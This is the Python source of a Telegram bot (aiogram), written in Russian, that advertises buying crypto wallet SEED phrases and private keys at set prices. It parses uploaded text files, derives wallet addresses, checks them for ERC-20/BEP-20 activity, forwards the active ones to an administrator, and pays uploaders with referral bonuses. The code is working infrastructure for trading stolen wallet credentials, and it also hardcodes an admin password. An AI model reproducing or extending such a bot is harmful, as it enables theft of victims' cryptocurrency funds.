# main.py
import asyncio
import os
import time
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, Document
from aiogram.filters import CommandStart
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
from aiogram.client.default import DefaultBotProperties
from aiogram.exceptions import TelegramBadRequest
from dotenv import load_dotenv
import aiosqlite  # 🔴 ОБЯЗАТЕЛЬНО: без этого ошибка NameError

load_dotenv()

TOKEN = os.getenv("TOKEN")
ADMIN_ID = int(os.getenv("ADMIN"))

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

from database import (
    init_db, get_or_create_user, register_referral, is_duplicate,
    add_wallet_hash, update_user_stats, get_user, get_stats,
    get_referral_count, get_referral_earnings, add_referral_bonus,
    hash_line
)
from wallet_utils import seed_to_address, private_key_to_address
from rpc_client import has_erc20_or_bep20_activity

class UploadFile(StatesGroup):
    waiting_file = State()

class SupportState(StatesGroup):
    waiting_for_message = State()

class WithdrawState(StatesGroup):
    waiting_for_amount = State()
    waiting_for_address = State()

class AdminState(StatesGroup):
    waiting_for_password = State()
    waiting_for_broadcast = State()


# --- Клавиатуры ---
main_menu = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="📂 Отправить файл", callback_data="upload")],
    [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
    [InlineKeyboardButton(text="👥 Рефералы", callback_data="referrals")],
    [InlineKeyboardButton(text="💰 Баланс", callback_data="balance")],
    [InlineKeyboardButton(text="💳 Вывести", callback_data="withdraw")],
    [InlineKeyboardButton(text="📞 Поддержка", callback_data="support")],
    [InlineKeyboardButton(text="ℹ️ Правила", callback_data="rules")],
])

admin_panel = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
    [InlineKeyboardButton(text="📤 Заявки на вывод", callback_data="admin_withdrawals")],
    [InlineKeyboardButton(text="📩 Массовая рассылка", callback_data="admin_broadcast")],
    [InlineKeyboardButton(text="🔙 Выход", callback_data="admin_logout")],
])

back_menu = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back")]
])


@dp.message(CommandStart())
async def start_cmd(message: Message):
    print(f"📩 /start от {message.from_user.id}")
    args = message.text.split()
    referrer_id = None
    if len(args) > 1 and args[1].startswith("ref_"):
        try:
            referrer_id = int(args[1].replace("ref_", ""))
        except:
            pass

    await get_or_create_user(message.from_user.id, message.from_user.username or "unknown")
    if referrer_id and referrer_id != message.from_user.id:
        await register_referral(message.from_user.id, referrer_id)

    text = (
        "👋 <b>Добро пожаловать!</b>\n\n"
        "🛒 <b>Скупка SEED-фраз и Private-ключей</b> с транзакциями в сетях:\n"
        "• <b>ERC-20 (Ethereum)</b>\n"
        "• <b>BEP-20 (BNB Smart Chain)</b>\n\n"
        "💰 <b>Цены:</b>\n"
        "• 🌱 SEED-фраза — <b>235₽</b>\n"
        "• 🔑 Private-key — <b>145₽</b>\n\n"
        "💸 <b>ПЛАТИМ САМУЮ ВЫСОКУЮ ЦЕНУ</b> + <b>70% от отработки</b> помимо прайса!\n\n"
        "🕒 <b>Выплаты каждый день в 23:00 (МСК)</b>"
    )
    await message.answer(text, reply_markup=main_menu)


@dp.callback_query(F.data == "upload")
async def upload_file_cb(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await callback.message.answer(
        "📂 Загрузите файл в формате <b>.txt</b>.\n\n"
        "📌 Поддерживается до <b>20 МБ</b>.\n"
        "🔍 Проверка: уникальность + активность"
    )
    await state.set_state(UploadFile.waiting_file)


@dp.message(UploadFile.waiting_file, F.document)
async def process_file(message: Message, state: FSMContext):
    document = message.document
    user_info = f"@{message.from_user.username}" if message.from_user.username else f"ID: {message.from_user.id}"
    
    try:
        await bot.send_message(ADMIN_ID, f"📩 Файл от {user_info}\n📄 {document.file_name}")
    except:
        pass

    if not document.file_name.endswith(".txt"):
        await message.answer("❌ Файл должен быть в формате <b>.txt</b>.")
        await state.clear()
        return

    await message.answer("📥 Скачиваю и анализирую файл...")

    try:
        file = await bot.get_file(document.file_id)
        max_size = 20 * 1024 * 1024
        if file.file_size > max_size:
            await message.answer("❌ Файл слишком большой. Максимум — 20 МБ.")
            await state.clear()
            return

        file_data = (await bot.download_file(file.file_path)).getvalue()
        content = file_data.decode("utf-8", errors="replace")
    except Exception as e:
        await message.answer(f"❌ Ошибка чтения файла: {e}")
        await state.clear()
        return

    lines = [line.strip() for line in content.splitlines() if line.strip()]
    total_lines = len(lines)
    if total_lines == 0:
        await message.answer("❌ Файл пуст.")
        await state.clear()
        return

    progress_msg = await message.answer(f"🔄 Обработка строк...\n✅ Обработано: 0 / {total_lines} (0%)")

    new_seeds = 0
    new_keys = 0
    total_reward = 0
    active_lines = []

    for i, line in enumerate(lines, 1):
        address = None
        is_valid = False

        word_count = len(line.split())
        if word_count in (12, 24) and all(w.isalnum() for w in line.split()):
            address = seed_to_address(line)
            wallet_type = 'seed'
            price = 235
        elif len(line) == 64 and all(c in "0123456789abcdefABCDEF" for c in line):
            address = private_key_to_address(line)
            wallet_type = 'key'
            price = 145
        else:
            continue

        if not address:
            continue

        h = hash_line(line)
        if await is_duplicate(h):
            continue

        if await has_erc20_or_bep20_activity(address):
            await add_wallet_hash(h, wallet_type, message.from_user.id)
            if wallet_type == 'seed':
                new_seeds += 1
            else:
                new_keys += 1
            total_reward += price
            is_valid = True
            active_lines.append(f"{address} | {wallet_type.upper()} | +{price}₽")

        if i % 5 == 0 or i == total_lines:
            percent = (i / total_lines) * 100
            try:
                await progress_msg.edit_text(
                    f"🔄 Обработка строк...\n"
                    f"✅ Обработано: {i} / {total_lines} ({int(percent)}%)"
                )
            except:
                pass

    if active_lines:
        filename = f"active_{message.from_user.id}.txt"
        with open(filename, "w", encoding="utf-8") as f:
            f.write("Активные кошельки (адрес | тип | оплата)\n")
            f.write("="*50 + "\n")
            f.write("\n".join(active_lines))
        try:
            await bot.send_message(ADMIN_ID, "✅ Найдены активные кошельки:")
            await bot.send_document(ADMIN_ID, document=open(filename, "rb"))
            os.remove(filename)
        except Exception as e:
            await bot.send_message(ADMIN_ID, f"❌ Ошибка отправки: {e}")

    if new_seeds or new_keys:
        await update_user_stats(message.from_user.id, total_lines, new_seeds, new_keys, total_reward)
        user = await get_user(message.from_user.id)
        if user and user['referred_by']:
            bonus = total_reward * 0.1
            await add_referral_bonus(user['referred_by'], bonus)
            try:
                await bot.send_message(user['referred_by'], f"🎉 Реферал заработал {total_reward}₽\n💸 Вам +{bonus:.2f}₽")
            except: pass

    if total_reward > 0:
        text = (
            f'✅ Файл <b>"{document.file_name}"</b> обработан!\n\n'
            f"📊 Найдено:\n"
            f"   • 🌱 SEED: <b>{new_seeds}</b> × 235₽\n"
            f"   • 🔑 Keys: <b>{new_keys}</b> × 145₽\n\n"
            f"📈 Всего строк: <b>{total_lines}</b>\n"
            f"💰 Заработано: <b>{total_reward:.2f} RUB</b>"
        )
    else:
        text = (
            f'⚠️ В файле <b>"{document.file_name}"</b> не найдено активных кошельков.\n\n'
            f"📈 Всего строк: <b>{total_lines}</b>\n"
            "❌ Баланс не пополнен."
        )

    try:
        await progress_msg.edit_text(text)
    except:
        await message.answer(text, reply_markup=main_menu)

    await state.clear()


@dp.callback_query(F.data == "withdraw")
async def withdraw_start(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    user = await get_user(callback.from_user.id)
    if not user or user['balance'] <= 0:
        await callback.message.edit_text("❌ Недостаточно средств.", reply_markup=back_menu)
        return
    await callback.message.edit_text(
        f"💰 Ваш баланс: <b>{user['balance']:.2f} RUB</b>\n\n"
        "Введите сумму для вывода (минимум 500₽):"
    )
    await state.set_state(WithdrawState.waiting_for_amount)


@dp.message(WithdrawState.waiting_for_amount)
async def withdraw_amount(message: Message, state: FSMContext):
    try:
        amount = float(message.text)
        if amount < 500:
            await message.answer("❌ Минимальная сумма вывода — 500₽.")
            return
    except:
        await message.answer("❌ Введите число.")
        return

    user = await get_user(message.from_user.id)
    if not user or amount > user['balance']:
        await message.answer("❌ Недостаточно средств.")
        await state.clear()
        return

    await state.update_data(amount=amount)
    await message.answer("📨 Введите ваш BNB (BEP-20) адрес:")


@dp.message(WithdrawState.waiting_for_address)
async def withdraw_address(message: Message, state: FSMContext):
    address = message.text.strip()
    if not (address.startswith("0x") and len(address) == 42 and all(c in "0123456789abcdefABCDEF" for c in address[2:])):
        await message.answer("❌ Неверный формат BNB-адреса.")
        return

    data = await state.get_data()
    amount = data['amount']
    user = message.from_user

    try:
        await bot.send_message(
            ADMIN_ID,
            f"💸 <b>Заявка на вывод</b>\n"
            f"👤 @{user.username or user.id}\n"
            f"💰 {amount} RUB\n"
            f"📤 Адрес: <code>{address}</code>",
            parse_mode="HTML"
        )
        await message.answer(
            f"✅ Заявка на вывод <b>{amount} RUB</b> отправлена!\n"
            f"Адрес: <code>{address}</code>\n"
            "Администратор обработует запрос в ближайшее время.",
            parse_mode="HTML",
            reply_markup=main_menu
        )
    except Exception as e:
        await message.answer("❌ Ошибка при отправке заявки.")
        print(f"❌ Ошибка: {e}")

    await state.clear()


# --- Другие кнопки ---
@dp.callback_query(F.data == "profile")
async def profile_cb(callback: CallbackQuery):
    await callback.answer()
    user = await get_user(callback.from_user.id)
    if not user:
        await callback.message.edit_text("❌ Ошибка.", reply_markup=back_menu)
        return
    text = (
        f"👤 <b>Профиль</b>\n\n"
        f"🆔 ID: <code>{user['user_id']}</code>\n"
        f"📝 Строк: {user['total_lines']}\n"
        f"🌱 SEED: {user['unique_seeds']}\n"
        f"🔑 Keys: {user['unique_keys']}\n"
        f"💰 Заработано: {user['balance']:.2f} RUB"
    )
    await callback.message.edit_text(text, reply_markup=back_menu)


@dp.callback_query(F.data == "referrals")
async def referrals_cb(callback: CallbackQuery):
    await callback.answer()
    ref_count = await get_referral_count(callback.from_user.id)
    earnings = await get_referral_earnings(callback.from_user.id)
    ref_link = f"https://t.me/your_bot_username_bot?start=ref_{callback.from_user.id}"
    text = (
        f"👥 <b>Рефералы</b>\n\n"
        f"🔗 Ссылка: <code>{ref_link}</code>\n"
        f"👥 Приглашено: {ref_count}\n"
        f"💸 Заработано: {earnings:.2f} RUB"
    )
    await callback.message.edit_text(text, reply_markup=back_menu)


@dp.callback_query(F.data == "balance")
async def balance_cb(callback: CallbackQuery):
    await callback.answer()
    user = await get_user(callback.from_user.id)
    bal = user['balance'] if user else 0.0
    await callback.message.edit_text(f"💰 Баланс: <b>{bal:.2f} RUB</b>", reply_markup=back_menu)


@dp.callback_query(F.data == "support")
async def support_cb(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await callback.message.edit_text("📩 Отправьте сообщение, и админ ответит.", reply_markup=back_menu)
    await state.set_state(SupportState.waiting_for_message)


@dp.callback_query(F.data == "rules")
async def rules_cb(callback: CallbackQuery):
    await callback.answer()
    text = (
        "📜 <b>Правила</b>\n\n"
        "1️⃣ Только .txt файлы\n"
        "2️⃣ Только активные кошельки (ETH/BNB)\n"
        "3️⃣ Обман = бан\n"
        "4️⃣ Выплаты в 23:00 (МСК)"
    )
    await callback.message.edit_text(text, reply_markup=back_menu)


@dp.callback_query(F.data == "back")
async def back_cb(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    current_state = await state.get_state()
    if current_state:
        await state.clear()
    await callback.message.edit_text("Главное меню:", reply_markup=main_menu)


# --- Админ-панель ---
@dp.message(F.text == "/admin")
async def admin_login_cmd(message: Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        return
    await message.answer("🔐 Введите пароль для входа в админ-панель:")
    await state.set_state(AdminState.waiting_for_password)


@dp.message(AdminState.waiting_for_password)
async def admin_password_check(message: Message, state: FSMContext):
    password = message.text.strip()
    if password == "Linar1212@":
        await message.answer("✅ Добро пожаловать в админ-панель!", reply_markup=admin_panel)
        await state.clear()
    else:
        await message.answer("❌ Неверный пароль.")
        await state.clear()


@dp.callback_query(F.data == "admin_stats")
async def admin_stats(callback: CallbackQuery):
    await callback.answer()
    stats = await get_stats()
    text = (
        "📊 <b>Статистика</b>\n\n"
        f"👥 Пользователей: {stats['users']}\n"
        f"📈 Строк: {stats['lines']}\n"
        f"🌱 SEED: {stats['seeds']}\n"
        f"🔑 Keys: {stats['keys']}\n"
        f"💸 Выплачено: {stats['payout']:.2f} RUB"
    )
    await callback.message.edit_text(text, reply_markup=admin_panel)


@dp.callback_query(F.data == "admin_broadcast")
async def admin_broadcast_start(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ Доступ запрещён", show_alert=True)
        return
    
    await callback.answer()
    await callback.message.edit_text(
        "📩 Отправьте сообщение для рассылки.\n"
        "Поддерживается: текст, фото, видео, файлы и т.д.",
        reply_markup=back_menu
    )
    await state.set_state(AdminState.waiting_for_broadcast)


@dp.message(AdminState.waiting_for_broadcast)
async def admin_broadcast_send(message: Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ Доступ запрещён.")
        await state.clear()
        return

    broadcast_message = message
    await state.clear()

    async with aiosqlite.connect("bot.db") as db:
        cursor = await db.execute("SELECT user_id FROM users")
        rows = await cursor.fetchall()

    if not rows:
        await message.answer("📭 Нет пользователей для рассылки.", reply_markup=admin_panel)
        return

    sent = 0
    failed = 0

    await message.answer("📤 Начинаю рассылку...")

    for (user_id,) in rows:
        try:
            await broadcast_message.send_copy(chat_id=user_id)
            sent += 1
            await asyncio.sleep(0.05)
        except Exception as e:
            error_msg = str(e).lower()
            if "bot_blocked" in error_msg or "user_deactivated" in error_msg:
                print(f"🚫 Пользователь заблокировал бота: {user_id}")
            elif "chat_not_found" in error_msg:
                print(f"❌ Чат не найден: {user_id}")
            else:
                print(f"⚠️ Ошибка при отправке {user_id}: {e}")
            failed += 1

    await message.answer(
        f"✅ <b>Рассылка завершена!</b>\n\n"
        f"📬 Успешно: <b>{sent}</b>\n"
        f"❌ Ошибок: <b>{failed}</b>",
        parse_mode='HTML',
        reply_markup=admin_panel
    )


@dp.callback_query(F.data == "admin_logout")
async def admin_logout(callback: CallbackQuery):
    await callback.answer()
    await callback.message.edit_text("👋 Вы вышли из админ-панели.", reply_markup=main_menu)


# --- Запуск ---
async def main():
    await init_db()
    print("✅ База данных инициализирована")
    print("🚀 Бот запущен в режиме polling...")
    while True:
        try:
            await dp.start_polling(bot, drop_pending_updates=True)
            break
        except Exception as e:
            print(f"❌ Ошибка: {e}")
            await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(main())
